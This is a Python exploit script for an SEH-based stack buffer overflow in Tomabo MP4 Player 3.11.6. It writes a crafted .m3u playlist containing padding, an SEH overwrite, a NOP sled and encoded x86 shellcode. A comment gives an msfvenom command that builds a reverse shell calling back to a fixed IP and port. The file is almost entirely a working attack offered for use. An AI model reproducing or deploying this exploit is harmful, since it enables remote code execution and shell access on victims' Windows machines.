#!/usr/bin/python
 
#####################################################################
# Exploit Title: Tomabo MP4 Player 3.11.6 SEH Based Stack Overflow  #
# Exploit Author: @yokoacc, @nudragn, @rungga_reksya                #
# Vendor Homepage: http://www.tomabo.com/                           #
# Software Link: http://www.tomabo.com/mp4-player/download.html     #
# Vulnerable App: Attached                                          #
# Version: 3.11.6 (possibility <= 3.11.6)                           #
# Tested on: Windows XP, 7, 8, and 8.1                              #
# Special Thanks to: @OffsecTraining                                #
# Vendor Notification: August 30th, 2015                            #
# Fixed Date: Around September 16th, 2015 (didn't response yet)     #
# Public Disclosure: October 18th, 2015                             #
#####################################################################
 
# How to: Run the code and open the m3u file with the Vulnerable MP4 Player by Tomabo
# Bad Character = '\x00\x09\x0a\x0b\x0c\x0d\x1a\x20'
# Payload= windows/meterpreter/bind_tcp ; PORT=4444\x00\x09\x0a\x0b\x0c\x0d\x1a\x20
#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b "\x00\x09\x0a\x0b\x0c\x0d\x1a\x20" -i 3 -f c
 
file ="whatever.m3u"
 
load = "\x41" * 1028
load += "\xeb\x08\x90\x90"
load += "\xA9\x1C\x40\x00"
load += "\x90" * 16
load += ("\xbe\x54\x81\x76\x95\xda\xd5\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x5f\x83\xe8\xfc\x31\x70\x10\x03\x70\x10\xb6\x74\xcc\xbc\xd6"
"\xfb\xb5\x65\xcf\xdd\xc2\xbd\x1b\x85\x19\x77\x52\x6e\x6f\xd7"
"\x81\x8c\xdf\xc2\x2a\x7a\x23\x0e\xf0\x24\x61\x16\xfb\xa0\xfc"
"\x9b\x29\x5e\x41\x9a\x71\x86\xca\x05\xe7\x12\xc5\x7f\x7a\x57"
"\x37\x6d\xcc\xfa\x2a\xb2\x43\x2d\x24\x82\x01\x89\x83\xb1\x21"
"\x04\xd7\xb2\x6c\xbd\xbf\xfa\x7c\x7a\x36\x34\xdf\x9a\x6d\x93"
"\x64\x9e\x9d\x61\x12\xb0\x32\x3f\x66\xd0\xb8\x92\x92\xff\x46"
"\x16\xf3\x39\x3e\x33\x4d\x3f\x0f\x7e\x0e\x5c\x53\xa1\xab\x78"
"\xba\x1c\x91\x51\x1f\x50\x95\x9f\x7a\x95\xd2\x23\x26\x89\x9c"
"\x2a\xd2\x65\x1e\x27\x36\x75\x60\x71\x87\x17\x6b\xa2\x05\xb8"
"\x5a\x42\xe7\xf0\xaf\x1e\x58\x6d\x49\x44\x91\x76\x48\xc5\xa2"
"\xb9\x6e\xa5\x76\x59\x92\xaf\x31\xd6\x46\x51\x90\x2e\x1d\xc9"
"\xaa\x34\xd5\xff\xad\x29\x8c\x60\x5b\xe4\xc1\x64\x42\xd8\xb6"
"\x57\x41\x85\x54\xa0\x82\xd7\xf4\xea\x32\xbb\x2c\xdc\x80\xeb"
"\xd3\xe1\x93\x2c\xa3\x3c\x91\x3c\x25\xf7\xbd\x6e\x61\x12\x0f"
"\xe3\x72\xef\xd0\xa1\x90\x7c\xee\x55\x2d\x38\xe5\x60\x9b\x1c"
"\xeb\x10\xc4\x64\x68\xe6\x38\x8e\x47\xc3\x66\xe0\x95\xf9\x29"
"\xe8\xb7\x85\xbe\x36\x56\x7c\x35\xd5\xc6\x02\x4c\xed\xea\x50"
"\x4c\x9f\x52\x73\x53\x62\x3a\x02\x2a\x32\x57\x83\xd2\x5f\xd8"
"\xa8\x7d\x66\xd4\xfe\xf3\xda\x64\xff\xce\x46\x04\xc0\x1c\x87"
"\xa4\xe9\xd4\x17\x80\xdd\x72\xc3\x15\x8d\x5c\x93\x05\xf1\x96"
"\x59\x33\xd2\x19\x98\xf8\x29\xe3\x48\x63\x06\xae\x38\x1c\x3c"
"\xce\x17\x85\x81\x4b\x0f\x1b\x2c\x17\xfb\x51\x52\x26\x53\x85"
"\xf4\x62\x01\x96\x3f\x8e\xe2\x80\xec\x43\x74\xd1\x90\x5e\xab"
"\xb6\xb1\xa5\x1f\xc0\x03\x01\x35\x05\xc1\xd3\x03\x48\x79\xb5"
"\xb0\x33\x5a\x12\x3b\xc3\xde\x19\x6f\xe7\x58\x30\x67\xd1\x1c")
 
load += "\x44" * (1800 - len(load))
 
writeFile = open (file, "w")
writeFile.write(load)
writeFile.close()